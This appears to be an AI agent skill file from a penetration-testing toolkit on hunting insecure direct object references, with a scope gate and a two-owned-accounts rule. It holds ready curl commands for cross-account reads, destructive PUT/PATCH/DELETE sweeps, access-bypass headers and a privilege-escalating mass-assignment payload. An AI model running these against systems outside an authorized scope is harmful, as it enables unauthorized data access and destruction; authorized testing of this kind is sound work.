---
name: zp-idor
description: ZeroProtocol hunter for insecure direct object references and broken object-level authorization. Use when object identifiers appear in a path, body, query string or JSON field, when testing whether one user can reach another user's data, when hunting BOLA on an API, when checking multi-tenant isolation, or when probing mass assignment. Built on the two-account method - a finding is only real when account A reads or writes account B's object and you can show both sides.
---

# zp-idor - two accounts, one boundary

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

**The method is the whole skill:** register two accounts you own, take an object id from
account B, ask for it as account A. If A gets it, that is the finding, and you have both
sides of the evidence without ever touching a real user.

Never test IDOR against a real customer's id. If you can only demonstrate it by reading a
stranger's data, you have a design problem with your test, not a better report.

---

## Procedure

**1. Set up the two accounts first.** Do not start probing until you have them.

```
Account A: your-handle+zpa@…   session token / cookie -> $TOK_A   user id -> $UID_A
Account B: your-handle+zpb@…   session token / cookie -> $TOK_B   user id -> $UID_B
```

Create one distinctive object in B - an order, a note, a file with a canary string in it - so
that when A retrieves it you can prove *which* object crossed the boundary.

**2. Inventory every identifier.** They hide in more places than the URL.

```bash
grep -ohE '"(id|_id|uuid|guid|user_?id|account_?id|org_?id|tenant_?id|customer_?id|order_?id|file_?id|doc_?id|invoice_?id|ref|key|slug|token)"\s*:\s*[^,}]+' \
  surface/*.json 2>/dev/null | sort -u
grep -oE '/[a-z]+/[0-9]{1,12}(/|$)' surface/endpoints.txt | sort -u
grep -oE '[?&](id|uid|user|account|order|doc|file|ref)=[^&]*' surface/urls.txt | sort -u
```

| Id shape | What to try |
|---|---|
| sequential integer | `id-1`, `id+1`, `1`, `0`, `-1`, a very large value |
| UUIDv4 | not guessable - **leak it** from a list endpoint, search, export, or an email. Then replay |
| UUIDv1 | timestamp+MAC based; predictable in principle. Usually easier to leak |
| base64 | decode it (`base64 -d`), it is often `user:123` or `{"id":123}`. Edit and re-encode |
| MD5/SHA of an integer | hash 1..10000 offline and compare. Very common, very broken |
| composite `orgId_userId` | change one half only - the half that is not checked |
| JWT `sub` claim | -> `zp-jwt-oauth`; if it verifies, the id is not the weak point |
| "encrypted" blob | look for ECB patterns, bit-flipping, or a padding oracle. Otherwise leak it |

**3. Run the differential.** Three requests, every time. The third is the one people skip and
it is the one that makes the report airtight.

```bash
OBJ=<an id belonging to account B>
curl -sk "https://$H/api/orders/$OBJ" -H "Authorization: Bearer $TOK_B" -o as_b.json -w 'B: %{http_code}\n'
curl -sk "https://$H/api/orders/$OBJ" -H "Authorization: Bearer $TOK_A" -o as_a.json -w 'A: %{http_code}\n'
curl -sk "https://$H/api/orders/$OBJ"                                   -o anon.json -w 'anon: %{http_code}\n'
diff as_b.json as_a.json && echo "A SEES B'S OBJECT VERBATIM -> confirmed IDOR"
```

| B / A / anon | Reading |
|---|---|
| 200 / 200 identical | **confirmed IDOR** |
| 200 / 200 but A's copy is redacted | partial leak. Diff the fields; metadata-only may still be a finding |
| 200 / 403 / 401 | correctly authorized. Killed for this endpoint |
| 200 / 404 | authorized *and* not leaking existence. Good implementation |
| 200 / 403 / **200** | **anonymous access** - worse than IDOR. Report immediately |
| 200 / 200 where the id is unguessable | still a finding, severity depends on how ids leak. Find the leak |

**4. Sweep the verbs, not just GET.** Read access is the least of it - but run the read-only
sweeps of steps 7 and 8 **before** the writing verbs. A `DELETE` that lands removes the canary,
and every later probe against `$OBJ` then answers 404: the sibling surface where most of this
class actually lives reads as "correctly authorized" when it was never tested. `PUT`/`PATCH` with
`-d '{}'` blanks the canary string the same way, and with it the proof of *which* object crossed.
Give each destructive verb its own fresh victim.

```bash
curl -sk "https://$H/api/orders/$OBJ" -H "Authorization: Bearer $TOK_A" \
  -o /dev/null -w 'GET     %{http_code}\n'
curl -sk -X POST "https://$H/api/orders/$OBJ" -H "Authorization: Bearer $TOK_A" \
  -H 'Content-Type: application/json' -d '{}' -o /dev/null -w 'POST    %{http_code}\n'
for M in PUT PATCH DELETE; do
  VIC=$(create_order_as_b)        # your own disposable object in B, canary string inside
  printf '%-7s ' "$M"
  curl -sk -X "$M" "https://$H/api/orders/$VIC" -H "Authorization: Bearer $TOK_A" \
    -H 'Content-Type: application/json' -d '{}' -o /dev/null -w '%{http_code}\n'
done
curl -sk "https://$H/api/orders/$OBJ" -H "Authorization: Bearer $TOK_B" | grep -q zpcanary \
  || echo "CANARY GONE - re-create it before reading any later 404 as authorized"
```

A `PATCH` or `DELETE` that works on B's object is a far more severe finding than a `GET`.
**Be careful:** test destructive verbs only against objects **you created in B**, never
against anything you did not make, and never twice against the same one. A `DELETE` that
succeeds has destroyed data - so mint the victim immediately before the probe.

**5. Method and header overrides - the common bypass.**

```
X-HTTP-Method-Override: PUT      _method=PUT       X-Original-URL: /api/admin/orders/1
X-Rewrite-URL: /admin            X-Forwarded-For: 127.0.0.1
```

**6. Mass assignment - the write-side sibling.** Add fields the client never sends.

```bash
curl -sk -X PATCH "https://$H/api/users/$UID_A" -H "Authorization: Bearer $TOK_A" \
  -H 'Content-Type: application/json' \
  -d '{"email":"zp@example.com","role":"admin","is_admin":true,"verified":true,
       "credit":999999,"tenant_id":"'$TENANT_B'","user_id":"'$UID_B'"}'
curl -sk "https://$H/api/users/$UID_A" -H "Authorization: Bearer $TOK_A" | jq   # did any of it stick?
```

Read the object back. A field accepted silently and persisted is the finding; a `200` alone
proves nothing.

**7. Nested and sibling objects.** Authorization is usually checked on the parent and forgotten
on the child.

```
/api/orders/<B_ORDER>/items          /api/orders/<A_ORDER>/items/<B_ITEM>
/api/users/<A>/documents/<B_DOC>     /api/teams/<A_TEAM>/members/<B_USER>
```

The second form is the classic: the server validates that `A_ORDER` belongs to A, then loads
`B_ITEM` by id without re-checking.

**8. The sibling sweep after any hit.** One IDOR means the codebase has a *pattern* of missing
checks. Walk every adjacent endpoint - a large share of paid access-control bugs are found
here, not in the original probe. A uniform 404 column is a result only once you have confirmed
the canary object is still there as B; otherwise you are reading your own `DELETE`.

```bash
for ep in orders invoices documents files messages notifications exports \
          subscriptions payment-methods addresses api-keys webhooks members; do
  printf '%-16s ' "$ep"
  curl -sk "https://$H/api/$ep/$OBJ" -H "Authorization: Bearer $TOK_A" -o /dev/null -w '%{http_code}\n'
done
```

---

## Confirm or kill

| Situation | Verdict |
|---|---|
| A reads B's object, bodies identical | confirmed. Severity by data sensitivity |
| A writes/deletes B's object | confirmed, higher. The strongest form |
| A reads B's object but the data is already public | **killed.** Check in a logged-out browser first |
| A gets a 200 with an empty or filtered body | probably correct behaviour. Diff carefully before claiming |
| the id is a UUID and you cannot obtain it without B's session | not exploitable yet. Find the leak, then report the chain |
| two accounts in the same org/team | that may be *intended* sharing. Check the product's permission model |
| the endpoint is documented as public | killed |
| anonymous access works | report as missing authentication, more severe than IDOR |
| you only reproduced it once | re-verify. Caches and sticky sessions produce phantom hits |

**Read the product's permission model before reporting.** In a team-based product, one member
reading another's document is often the feature. The boundary that matters is the one the
product promises - tenant, organization, or private-to-me - and your two accounts must sit on
opposite sides of *that*.

---

## High-value patterns

- **Tenant boundary in a multi-tenant SaaS** - the highest-value shape there is. Two orgs, one id.
- **Billing and payment objects** - invoices, payment methods, subscriptions. Sensitive by definition.
- **Export and report endpoints** - often bulk, often built for admins, often missing the per-object check.
- **`api_keys` / `webhooks` / `integrations`** - reading another tenant's API key is full account compromise.
- **File and document download by id** - `/files/1234` with no ownership check is the most common real IDOR.
- **Nested child objects** - see step 7. The parent is checked, the child is not.
- **Admin endpoints reachable with a user token** - that is `zp-authz`, and often sits right next to an IDOR.

---

## Pitfalls

- **Testing against a real user's id.** Use your two accounts. Always.
- **`DELETE` on an object you did not create.** You destroyed someone's data. And a `DELETE` on your own canary before the read-only sweeps destroys the rest of the test - order the steps, one fresh victim per destructive verb.
- **Reporting already-public data.** Check logged out, in a fresh browser, before writing.
- **Reporting a 200 with no body diff.** Diff, or you are guessing.
- **Missing the write verbs.** GET-only testing finds the least severe half of this class.
- **Ignoring the product's sharing model** and reporting intended collaboration as a vuln.
- **Stopping at one endpoint.** The sibling sweep is where the volume is.
- **Not doing the anonymous test.** If anon works, your IDOR report understates the severity.
- **Bulk-enumerating ids** to show scale. One crossing proves it; enumerating 10,000 records is exfiltration.

---

## Hand off to

Confirmed -> `zp-triage` then `zp-report`, with both accounts' responses side by side.
Role and endpoint-level gaps -> `zp-authz`. Ids inside a token -> `zp-jwt-oauth`.
GraphQL node-id variants -> `zp-graphql`. Id leak source -> `zp-js-secrets`, `zp-api`.
Source available -> `zp-code-audit` to enumerate every unchecked loader.
